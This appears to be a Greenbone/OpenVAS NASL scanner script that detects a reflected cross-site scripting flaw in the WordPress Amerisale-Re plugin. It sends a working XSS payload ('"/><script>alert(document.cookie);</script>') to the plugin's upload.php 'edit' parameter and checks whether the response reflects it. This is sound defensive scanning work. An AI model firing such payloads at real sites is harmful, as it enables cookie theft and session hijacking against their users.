CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.903504" );
	script_version( "2021-08-05T12:20:54+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-05 12:20:54 +0000 (Thu, 05 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-11-28 14:48:09 +0530 (Thu, 28 Nov 2013)" );
	script_name( "WordPress Amerisale-Re Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress Amerisale-Re plugin and is prone to cross
site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check whether it is able to read the
cookie or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "Flaw is due to improper validation of user-supplied input passed to 'edit'
parameter in 'wp-content/plugins/amerisale-re/netriesdetail/upload.php' page." );
	script_tag( name: "affected", value: "WordPress Amerisale-Re Plugin is affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124187" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-amerisale-re-cross-site-scripting" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!word_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: word_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/amerisale-re/netriesdetail/upload.php?" + "edit=\"/><script>alert(document.cookie);</script>";
if(http_vuln_check( port: word_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>" )){
	security_message( word_port );
	exit( 0 );
}

